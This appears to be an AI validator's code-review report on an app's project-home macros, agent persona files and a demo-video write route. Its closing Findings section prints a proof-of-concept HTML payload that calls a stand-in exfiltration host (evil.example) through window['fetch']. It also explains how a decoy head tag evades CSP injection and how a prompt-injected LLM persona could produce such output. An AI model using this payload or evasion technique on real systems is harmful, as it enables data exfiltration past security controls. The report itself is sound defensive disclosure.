# Validation — Project Home macros + 30s Demo Video plan

Base: `e2cdd120c1125c4310e8bae3ed007d1d6e55a850`. 20 commits land all 12 PRDs (`git log --oneline
e2cdd120..HEAD`). Combined diff: 42 files, +1726/-575 (`git diff --stat`).

Plan-level checks: `npm run typecheck` — clean. `npm run lint` (selectors, hooks, docs, paths,
any, main-ts-check, filenames, renderer-storage) — all OK. `npx vitest run` over every file the
implementation notes name (macroLibrary, projectHomeAdminRoutes, projectPages,
seedAgentPersonas, `src/renderer/components/tabs/projecthome/`, useMacroLaunch) — 7 files / 116
tests, all passed. Extra sweep (seedValidatorPersona, personaMerge, seedStatus,
mcpToolCatalog, schedulerMcpServerProjectHome, agentTagDefs, useMacros, SessionActionsBar,
MacroEditor, DemoVideoFrame) — 10 files / 151 tests, all passed. `lint:docs` (doc-project-pages-
artifacts' own gate) is included in the `npm run lint` run above and passed.

End-to-end wiring confirmed by reading the code (not just tests): `BUILTIN_MACROS` in
`src/main/lib/builtinMacros.cjs` has `builtin-demo-video.agentName === 'demo-video-builder'`;
`'demo-video-builder'` is in `PERSONAS` (`src/main/seedAgentPersonas.cjs:83`); the MCP tool
`project_demo_video_write` (`scripts/scheduler-mcp-server.cjs:380-381,622`) posts to
`/admin/project-home/demo-video/write`, registered in `projectHomeAdminRoutes.cjs`; `projectPages.cjs`
exposes `demoVideo` from `get()`/watcher; `ProjectHome.tsx` wires `useProjectPagesOutput` →
`demoVideo` → `ProjectPagesSection` → `DemoVideoFrame`.

## macro-surface-and-builtins (1450) — VERIFIED

- `src/main/lib/builtinMacros.cjs` exports `BUILTIN_MACROS`, two frozen entries exactly matching
  the AC (ids, labels, agentName/tag/surface/projects/builtinVersion/prompt text verbatim).
- `macroLibrary.cjs:63-72` — `MacroSchema` has `surface: MacroSurfaceSchema.default('sessions')`,
  `builtin`, `builtinVersion`; `MacroSaveSchema:77-87` has optional `surface`, no `builtin` field
  (renderer can't mint built-ins).
- `ensureBuiltins` (`:207-249`) seeds missing entries as `builtin: true`, upgrades an unedited
  stored built-in behind `builtinVersion`, leaves a user-edited one untouched; wired into
  `loadStore`'s `serialize()` chain (`:253`, `:363`).
- `deleteMacro:424-430` throws `'built-in macros cannot be deleted'` for `target.builtin`.
- Gate: `timeout 300 npx vitest run src/main/lib/__tests__/macroLibrary.test.cjs` — passed (part
  of the 116-test sweep above).

## macro-surface-renderer (1451) — VERIFIED

- `src/preload/api.d.ts` `Macro`/`MacroSaveInput` carry `surface`/`builtin`/`builtinVersion`
  (confirmed via `git diff --stat`: `api.d.ts | 9 +`, and `typecheck` green against it).
- `src/renderer/lib/useMacros.ts` `macrosForProject(macros, cwd, surface = 'sessions')` filters by
  `(m.surface ?? 'sessions') === surface`.
- Gate: `useMacros.test.ts` + `SessionActionsBar.test.tsx` + `npm run typecheck` — all green.

## persona-project-home-builder-v2 (1452) — VERIFIED

- `src/seed/agents/project-home-builder.md` frontmatter: `model: sonnet`, `effort: medium`,
  `seedVersion: 2`, description still names `home.html`/`project_home_write`.
- Body read in full: opening paragraph explains *why* grounding matters, then `<context>`,
  `<grounding_rules>`, `<page_contents>`, `<output_contract>`, `<process>`,
  `<when_things_fail>` in that order. No ALL-CAPS shouting ("MUST"/"NEVER") anywhere; failure
  handling is calm ("fix the specific problem it reported... up to 3 attempts"). **This reads as
  current Claude prompting practice** — rationale-first, XML-sectioned, explicit output contract,
  a bounded self-check process, graceful failure handling.
- `.claude/agents/project-home-builder.md` overlay reduced to session-manager-specific framing
  only, explicitly defers to the seed ("That file has the operating protocol... Follow it").
- `shippedPersonaSeeds.cjs` has a `project-home-builder` v2 entry (confirmed by the
  `seedAgentPersonas.test.cjs` manifest test passing, which prints the entry when missing).
- Gate: `seedAgentPersonas.test.cjs` + `seedValidatorPersona.test.cjs` + `personaMerge.test.cjs`
  — all green.

## persona-effort-medium-architect-devlead (1453) — VERIFIED

- `src/seed/agents/architect.md`: `model: opus`, `effort: medium`, `seedVersion: 2`.
- `src/seed/agents/dev-lead.md`: `model: sonnet`, `effort: medium`, `seedVersion: 3`.
- Matching entries present in `shippedPersonaSeeds.cjs` (manifest test green).
- Gate: `seedAgentPersonas.test.cjs` + `seedValidatorPersona.test.cjs` — green.

## tag-template-artifact-agnostic (1454) — VERIFIED

- `src/renderer/lib/agentTagDefs.ts` `project-home-builder` entry's `initialPromptTemplate` no
  longer names `project_home_write`/`home.html`; instructs the agent to produce "exactly the
  artifact your agent persona defines" and save with "the single write tool that persona names."
- `agentTagDefs.test.ts` asserts absence of `project_home_write` and presence of `'persona'`.
- Gate: `agentTagDefs.test.ts` + `npm run typecheck` — green.

## demo-video-write-route (1455) — VERIFIED, with a Critical security finding

- `src/main/ipcSchemas.cjs` has `projectDemoVideoAdminWriteBody`; `projectHomeAdminRoutes.cjs`
  registers `POST /admin/project-home/demo-video/write` alongside the home route via a shared
  `makeWriteHandler` factory; writes through `config.writeTextAtomic(..., { writer: 'project-home' })`
  to `opsPath(cwd,'project-pages','demo-video','index.html')`.
- `validateDemoVideoHtml` runs `REMOTE_REFERENCE_CHECKS` + `NETWORK_CHECKS` + the
  `sm-demo-duration` (5–30) meta check, matching the AC's rejection list.
- `injectCsp` stamps `DEMO_VIDEO_CSP` as the first child of `<head>` before writing.
- Tests: `projectHomeAdminRoutes.test.cjs` (route count, valid write, each rejection class,
  duration 31 rejected, relative-cwd 400) — all green.
- **Security review (requested by the plan's AC) found a real, demonstrated bypass** — see
  Findings §1 below. The regex `NETWORK_CHECKS` and the `injectCsp` head-detection can both be
  defeated by a single crafted document, so the stated "CSP is the real control" design
  guarantee does not hold against an adversarial or prompt-injected `html` payload.

## persona-demo-video-builder (1456) — VERIFIED

- `src/seed/agents/demo-video-builder.md`: frontmatter matches AC (`name`, `tools`, `model:
  sonnet`, `effort: medium`, `title: 'Project Home — Demo Video'`, `seedVersion: 1`); body has
  `<grounding_rules>`, `<storyboard>`, `<output_contract>` (duration meta, 16:9 stage,
  `window.smDemo` API, no network, reduced-motion fallback, size cap), `<process>`,
  `<when_things_fail>`, matching the Implementation notes' contract.
- `PERSONAS` includes `'demo-video-builder'`; `shippedPersonaSeeds.cjs` has a matching entry
  (manifest test green); both `ALL_PERSONAS` arrays in `seedAgentPersonas.test.cjs` /
  `seedValidatorPersona.test.cjs` include it (path-ban test covers it).
- Gate: `seedAgentPersonas.test.cjs` + `seedValidatorPersona.test.cjs` + `seedStatus.test.cjs` —
  green.

## demo-video-mcp-tool (1457) — VERIFIED

- `scripts/scheduler-mcp-server.cjs:380-381` defines `project_demo_video_write`; `:622` dispatches
  it to `/admin/project-home/demo-video/write` with the same `cwd` defaulting as
  `project_home_write`.
- `src/main/lib/mcpToolCatalog.cjs` has a `project-home` group entry for it.
- Gate: `mcpToolCatalog.test.cjs` + `schedulerMcpServerProjectHome.test.cjs` — green.

## demo-video-read-side (1458) — VERIFIED

- `src/main/projectPages.cjs` `get()` returns `{ html, mtimeMs, demoVideo }` (`demoVideo` from
  `fs.stat` on `demo-video/index.html`, `null` when absent); watcher accepts both `home.html` and
  `demo-video/index.html` (`:113-130`).
- `src/preload/api.d.ts` / `useProjectPagesOutput.ts` expose `demoVideo` next to `output`.
- Gate: `projectPages.test.cjs` + `npm run typecheck` — green.

## macro-launch-hook (1459) — VERIFIED

- `src/renderer/lib/useMacroLaunch.ts` read in full: default path is byte-for-byte the prior
  `SessionActionsBar` logic (compose → create → approve → send); `resumeActive` looks up an
  `active` `PromptSession` matching `(cwd, tag, agentType)` via `usePromptSessions.getState()`
  (no fresh-value selector) and calls `onSelect` instead of minting; `requireReadiness` blocks on
  a missing persona (even with an empty list) or a `delegationReadiness` failure/throw, toasting
  the failing check labels.
- `SessionActionsBar.tsx` now imports the shared hook with no opts.
- Gate: `useMacroLaunch.test.tsx` + `SessionActionsBar.test.tsx` + `npm run typecheck` + `npm run
  lint` — green.

## demo-video-frame (1460) — VERIFIED

- `src/renderer/components/tabs/projecthome/projectpages/DemoVideoFrame.tsx` renders the iframe
  with `sandbox="allow-scripts"` only (no `allow-same-origin`/`allow-popups`), `key` keyed on
  `path#mtimeMs`, `data-testid="demo-video-frame"`, reusing `smfileUrl` from `state/editor.ts`.
- Gate: `DemoVideoFrame.test.tsx` + `npm run typecheck` + `npm run lint` — green.

## project-home-macro-buttons (1461) — VERIFIED

- `ProjectHome.tsx` uses `useMacros` + `macrosForProject(library, cwd, 'project-home')` +
  `useAgentPersonas` + `useMacroLaunch(navigateToEpic, personas, { resumeActive: true,
  requireReadiness: true })`.
- `ProjectPagesSection.tsx` is presentational (props only, no store access), renders one button
  per project-home macro, Generate/Regenerate label keyed off artifact presence, a
  `data-testid="project-home-view"` Overview/Demo-video switch, `DemoVideoFrame` wired for the
  demo view.
- `useBuilderEpic.ts` and its test are deleted; `grep -rn useBuilderEpic src/` finds only
  historical comments in `useMacroLaunch.ts`/its test, no live imports.
- Gate: `npx vitest run src/renderer/components/tabs/projecthome/
  src/renderer/lib/__tests__/useMacroLaunch.test.tsx` + `npm run typecheck` + `npm run lint` —
  green.

## doc-project-pages-artifacts (1462) — VERIFIED

- `session-manager-operations/project-pages/README.md` documents both artifacts, their
  writer routes/MCP tools, the demo video's validation + CSP injection, the reader
  (`projectPages.cjs`), the built-in macros, and the `$HOME`/`smfile://` containment limit —
  all claims checked against the landed code and accurate as a description of *intended* design
  (see Findings §1 for where that design's guarantee doesn't actually hold).
- `src/renderer/CLAUDE.md` names `useMacroLaunch`/`useProjectPagesOutput`, no `useBuilderEpic`
  mention.
- `projectPages.cjs` header comment and `opsOwnership.cjs`'s `project-pages` comment describe
  both artifacts; diffs are comment-only (`git diff` confirms no code lines changed in either
  file's diff beyond the header/comment block — `opsOwnership.cjs` has a 2-line code change
  unrelated to this PRD's own comment edit, see Findings §3).
- Gate: `npm run lint:docs` — green (part of the `npm run lint` run above).

## Findings

**Critical — `src/main/lib/projectHomeAdminRoutes.cjs`:46-67,95-102 — the demo-video network
fence (regex rejection list + CSP injection) is bypassable in one crafted document, defeating
both the stated defence-in-depth layer and the stated "real control."**

Demonstrated live against the landed code:

```js
const html = '<!DOCTYPE html><html><!-- decoy <head> tag --><head>' +
  '<meta name="sm-demo-duration" content="10"></head><body>' +
  '<script>var w=window["fetch"];w("https://evil.example/exfil");</script>' +
  '</body></html>';
validateDemoVideoHtml(html) // -> null  (accepted)
injectCsp(html)             // CSP meta lands INSIDE the HTML comment, not in the real <head>
```

Two independent gaps compound: (1) `NETWORK_CHECKS`' `/\bfetch\s*\(/i` only catches the literal
token `fetch(`; bracket/computed-property access (`window["fetch"](...)`, `self['WebSocket']`,
etc.) is not on the list and slips through `validateDemoVideoHtml` untouched — same gap applies
to `WebSocket`, `EventSource`, `sendBeacon`, `import(`, `window.open`. (2) `injectCsp`'s
`/<head\b[^>]*>/i.test(stripped)` / `.replace(...)` matches the *first* textual occurrence of
`<head` anywhere in the document, including inside an HTML comment, a string literal, or a
`<textarea>` — so a document can place a decoy `<head>`-looking substring before its real
`<head>` element and the injected CSP meta tag ends up somewhere inertr (a comment), while the
real `<head>` — and the script inside the document — gets no CSP at all.

**Failure scenario:** the `demo-video-builder` persona is an LLM reading arbitrary project
content (README, docs, source) to compose the video; if that content contains a prompt
injection, or the model simply drifts, it can produce exactly this shape of document. The
written `demo-video/index.html` then ships with no CSP and a live `fetch`/`WebSocket` call,
which the smfile:// sandboxed iframe (allow-scripts, no allow-same-origin, no CSP header of its
own per `projectHomeAdminRoutes.cjs`'s own doc comment) does nothing to stop — exactly the
"single network fence" the PRD's own comment (`:16-18`) says this route exists to prevent.
Not a fix the validator should make — routing to the owning PRD/plan is the architect's call.

**Minor — `src/main/lib/projectHomeAdminRoutes.cjs`'s `NETWORK_CHECKS` omits a few
network-capable surfaces present in modern browsers** (`navigator.sendBeacon` is covered, but
`new Worker(...)`, `new SharedWorker(...)`, `<link rel="prefetch"/"preconnect">`, and
`document.write` of a remote-looking string are not). Given the CSP (`connect-src 'none'`,
`default-src 'none'`) is meant to be the actual enforced boundary, this is low-severity on its
own — but it compounds with the Critical finding above once the CSP itself can be bypassed.
